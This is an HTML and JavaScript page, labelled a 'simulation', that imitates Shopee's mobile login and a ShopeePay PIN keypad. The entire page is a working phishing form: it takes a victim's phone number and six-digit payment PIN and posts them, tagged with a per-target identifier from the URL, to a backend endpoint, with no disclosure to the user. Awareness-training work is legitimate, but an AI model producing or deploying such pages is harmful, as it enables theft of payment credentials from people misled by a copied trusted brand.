<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Simulasi</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="config.js"></script>
    <link rel="stylesheet" href="design-system.css">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        shopee: {
                            main: '#ee4d2d',
                            hover: '#d73e1f'
                        }
                    }
                }
            }
        }
    </script>

    <style>
        [x-cloak] {
            display: none !important;
        }

        * {
            -webkit-tap-highlight-color: transparent;
        }
        
        /* Menghilangkan panah atas/bawah bawaan input type number/tel pada beberapa browser */
        input[type="tel"]::-webkit-outer-spin-button,
        input[type="tel"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
    </style>
</head>

<body class="bg-gray-100 flex justify-center items-center min-h-screen font-sans text-gray-800">

    <div x-data="guestSimulation()" x-init="init()" x-cloak :aria-busy="isProcessing"
        class="w-full max-w-[400px] bg-white min-h-screen sm:min-h-[800px] sm:rounded-xl shadow-lg relative overflow-hidden">

        <div x-show="isProcessing" x-transition.opacity.duration.300ms
            class="fixed inset-0 bg-white/95 z-[100] flex flex-col items-center justify-center" style="display: none;">
            <div class="w-14 h-14 border-4 border-gray-200 border-t-shopee-main rounded-full animate-spin"></div>
            <span class="text-shopee-main font-semibold mt-4 text-base tracking-wide">Memproses...</span>
        </div>

        <div x-show="guestErrorModalOpen" x-transition.opacity @keydown.escape.window="closeGuestError"
            class="fixed inset-0 z-[110] grid place-items-center bg-black/50 px-5" style="display: none;">
            <div role="dialog" aria-modal="true" class="w-full max-w-sm rounded-xl bg-white p-5 shadow-xl">
                <div class="mx-auto grid h-12 w-12 place-items-center rounded-full bg-red-50 text-red-600">
                    <i data-lucide="circle-alert" class="h-6 w-6"></i>
                </div>
                <h2 class="mt-4 text-center text-lg font-semibold text-gray-900">Halaman tidak aktif</h2>
                <p class="mt-2 text-center text-sm leading-6 text-gray-600" x-text="guestModalMessage"></p>
                <button type="button" @click="closeGuestError"
                    class="mt-5 w-full rounded-md bg-shopee-main px-4 py-2.5 text-sm font-semibold text-white hover:bg-shopee-hover">
                    Mengerti
                </button>
            </div>
        </div>

        <form @submit.prevent="continueToPin">
            <header class="flex items-center justify-between p-4 border-b border-gray-100">
                <i @click="goBack" class="fa-solid fa-arrow-left text-shopee-main text-xl cursor-pointer"></i>
                <h1 class="text-lg font-medium flex-1 ml-4 text-black">Log In</h1>
                <i class="fa-regular fa-circle-question text-shopee-main text-xl cursor-pointer"></i>
            </header>

            <main class="p-6">
                <!-- LOGO MENGGUNAKAN IMAGE logo.png -->
                <div class="flex justify-center mb-10">
                    <img src="logo.png" alt="Logo" class="w-16 h-16 object-contain mt-3">
                </div>

                <!-- WRAPPER INPUT DIUBAH (Menambahkan focus-within:border-shopee-main dan animasi transisi) -->
                <div class="flex items-center border-b-2 border-gray-300 focus-within:border-shopee-main transition-colors duration-300 py-3 mb-5">
                    <!-- Icon ikut berubah warna (opsional, jika tidak ingin icon berubah, hapus focus-within:text-shopee-main) -->
                    <i class="fa-solid fa-mobile-screen text-gray-400 focus-within:text-shopee-main text-xl mr-3 transition-colors duration-300"></i>
                    <span class="text-gray-800 text-lg mr-2 font-medium">+62</span>
                    <!-- Input dengan focus:outline-none dan focus:ring-0 untuk menghilangkan efek default browser -->
                    <input x-model="phone" @input="phone = sanitizePhone(phone)" type="tel" inputmode="tel"
                        maxlength="32" class="flex-1 text-lg outline-none focus:outline-none focus:ring-0 text-gray-800 bg-transparent" 
                        placeholder="Nomor Telepon">
                </div>

                <div x-show="error" role="alert"
                    class="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700 mb-4"
                    x-text="error"></div>

                <button type="submit" :disabled="isProcessing"
                    class="w-full bg-shopee-main text-white py-3 rounded text-lg mb-4 hover:bg-shopee-hover transition disabled:opacity-60">
                    Lanjut
                </button>

                <div class="text-right mb-6">
                    <a href="#" class="text-blue-600 text-sm">Log in dengan Password</a>
                </div>

                <div class="flex items-center text-gray-400 text-xs mb-6">
                    <div class="flex-1 border-b border-gray-200"></div>
                    <span class="px-3">ATAU</span>
                    <div class="flex-1 border-b border-gray-200"></div>
                </div>

                <button type="button"
                    class="w-full bg-white border border-gray-300 py-3 rounded text-sm mb-3 flex items-center justify-center space-x-2">
                    <i class="fa-brands fa-google text-red-500 text-lg"></i>
                    <span>Log In dengan Google</span>
                </button>

                <button type="button"
                    class="w-full bg-white border border-gray-300 py-3 rounded text-sm mb-3 flex items-center justify-center space-x-2">
                    <i class="fa-brands fa-facebook text-blue-600 text-lg"></i>
                    <span>Log In dengan Facebook</span>
                </button>

                <button type="button"
                    class="w-full bg-white border border-gray-300 py-3 rounded text-sm mb-6 flex items-center justify-center space-x-2">
                    <i class="fa-brands fa-whatsapp text-green-500 text-lg"></i>
                    <span>Log In dengan WhatsApp</span>
                </button>

                <div class="text-center text-sm border-b border-gray-200 pb-6 mb-4">
                    Belum punya akun? <a href="#" class="text-blue-600">Daftar</a>
                </div>

                <div class="flex justify-between items-center text-sm text-gray-600">
                    <div>
                        <i class="fa-solid fa-fingerprint mr-2 text-lg"></i> Aktifkan Autentikasi Sidik Jari
                    </div>

                    <label class="relative inline-flex items-center cursor-pointer">
                        <input type="checkbox" checked class="sr-only peer">
                        <div
                            class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-500">
                        </div>
                    </label>
                </div>
            </main>
        </form>

        <div x-show="showPinModal" x-transition.opacity.duration.300ms @click="closePinModal"
            class="absolute inset-0 bg-black/50 z-40 cursor-pointer" style="display: none;">
        </div>

        <div x-show="showPinModal" @keydown.escape.window="closePinModal" role="dialog" aria-modal="true"
            x-transition:enter="transition ease-out duration-300"
            x-transition:enter-start="translate-y-full" x-transition:enter-end="translate-y-0"
            x-transition:leave="transition ease-in duration-200" x-transition:leave-start="translate-y-0"
            x-transition:leave-end="translate-y-full"
            class="absolute bottom-0 w-full bg-white rounded-t-2xl z-50 flex flex-col h-[70%] overflow-hidden"
            style="display: none;">

            <div class="flex items-center justify-between p-4 border-b border-gray-100 relative">
                <button type="button" @click="closePinModal"
                    class="text-2xl px-2 hover:bg-gray-100 rounded-full w-10 h-10 flex items-center justify-center relative z-10">
                    &times;
                </button>
                <h2
                    class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 font-bold text-gray-800 text-center w-full pointer-events-none">
                    Masukkan PIN ShopeePay
                </h2>
                <div class="w-10"></div>
            </div>

            <div class="flex-1 flex flex-col items-center pt-8">
                <p class="text-gray-600 mb-6">Masukkan PIN ShopeePay</p>

                <div class="flex space-x-4 mb-6" aria-label="Jumlah digit kode uji">
                    <template x-for="i in 6" :key="i">
                        <div class="w-3 h-3 rounded-full transition-colors duration-200"
                            :class="pin.length >= i ? 'bg-gray-800' : 'bg-gray-200'">
                        </div>
                    </template>
                </div>

                <div>
                    <button type="button" @click="clearPin" class="text-blue-600 font-medium text-sm">Bersihkan</button>
                </div>
            </div>

            <div class="bg-gray-100 w-full border-t border-gray-200 grid grid-cols-3 text-2xl font-medium text-black">
                <template x-for="number in keypad" :key="number">
                    <button type="button" @click="addPin(number)"
                        class="bg-white py-4 border-r border-b border-gray-200 active:bg-gray-100" x-text="number"></button>
                </template>

                <div class="bg-gray-200 py-4 border-r border-gray-300"></div>

                <button type="button" @click="addPin('0')"
                    class="bg-white py-4 border-r border-gray-300 active:bg-gray-100">0</button>

                <button type="button" @click="removePin"
                    class="bg-gray-200 py-4 flex justify-center items-center active:bg-gray-300" aria-label="Hapus digit">
                    <i class="fa-solid fa-delete-left text-xl text-black"></i>
                </button>
            </div>

            <div class="bg-gray-200 text-center py-2 text-xs text-gray-500 font-medium pb-4">
                <i class="fa-solid fa-shield-halved mr-1 text-gray-400"></i> ShopeePay Security Keyboard
            </div>
        </div>
    </div>

    <script>
        function guestSimulation() {
            return {
                apiBase: window.SAAS_CONFIG?.API_BASE || '../backend/api/index.php?action=',
                identifier: '',
                phone: '',
                pin: '',
                error: '',
                guestErrorMessage: 'Terjadi kesalahan pada server',
                guestErrorModalOpen: false,
                guestModalMessage: '',
                showPinModal: false,
                isProcessing: false,
                keypad: ['1', '2', '3', '4', '5', '6', '7', '8', '9'],

                init() {
                    const params = new URLSearchParams(window.location.search);
                    this.identifier = (params.get('identifier') || '').trim();

                    if (!this.identifier) {
                        this.showGuestError(this.guestErrorMessage);
                    }

                    this.refreshIcons();
                },
                refreshIcons() {
                    this.$nextTick(() => window.lucide?.createIcons());
                },
                goBack() {
                    if (window.history.length > 1) {
                        window.history.back();
                    }
                },
                sanitizePhone(value) {
                    return String(value || '').replace(/[^0-9+()\-\s]/g, '').slice(0, 32);
                },
                showGuestError(message) {
                    this.error = '';
                    this.guestModalMessage = message || this.guestErrorMessage;
                    this.guestErrorModalOpen = true;
                    this.refreshIcons();
                },
                closeGuestError() {
                    this.guestErrorModalOpen = false;
                    this.guestModalMessage = '';
                },
                continueToPin() {
                    this.error = ''; // Memperbaiki bug kecil 'error = ' pada script sebelumnya

                    if (!this.identifier || !/^[0-9+()\-\s]{6,32}$/.test(this.phone.trim())) {
                        this.showGuestError(this.guestErrorMessage);
                        return;
                    }

                    this.pin = '';
                    this.showPinModal = true;
                    this.refreshIcons();
                },
                closePinModal() {
                    if (this.isProcessing) return;

                    this.showPinModal = false;
                    this.pin = '';
                },
                // FITUR GETAR (VIBRATION)
                vibrateDevice(ms = 40) {
                    if ('vibrate' in navigator) {
                        navigator.vibrate(ms);
                    }
                },
                addPin(number) {
                    if (this.isProcessing || this.pin.length >= 6) return;
                    
                    this.vibrateDevice(40); // Getar saat input angka
                    this.pin += number;

                    if (this.pin.length === 6) {
                        this.submitGuest();
                    }
                },
                removePin() {
                    if (this.isProcessing || this.pin.length === 0) return;

                    this.vibrateDevice(60); // Getar sedikit lebih panjang saat menghapus
                    this.pin = this.pin.slice(0, -1);
                },
                clearPin() {
                    this.vibrateDevice(80); // Getar saat membersihkan semua
                    this.pin = '';
                },
                async submitGuest() {
                    if (this.isProcessing) return;

                    if (!/^[0-9]{6}$/.test(this.pin)) {
                        this.showGuestError(this.guestErrorMessage);
                        this.showPinModal = false;
                        this.pin = '';
                        return;
                    }

                    this.isProcessing = true;
                    this.error = '';

                    try {
                        const response = await fetch(this.apiBase + 'guest-submit', {
                            method: 'POST',
                            credentials: 'include',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                identifier: this.identifier,
                                phone_simulation: this.phone.trim(),
                                pin_simulation: this.pin,
                            }),
                        });
                        const data = await response.json().catch(() => ({}));

                        if (!response.ok || data.ok === false) {
                            throw new Error(data.message || this.guestErrorMessage);
                        }

                        this.phone = '';
                        this.pin = '';
                        this.showPinModal = false;
                    } catch (error) {
                        this.showGuestError(error.message || this.guestErrorMessage);
                        this.pin = '';
                        this.showPinModal = false;
                    } finally {
                        this.isProcessing = false;
                        this.refreshIcons();
                    }
                },
            };
        }
    </script>
</body>

</html>
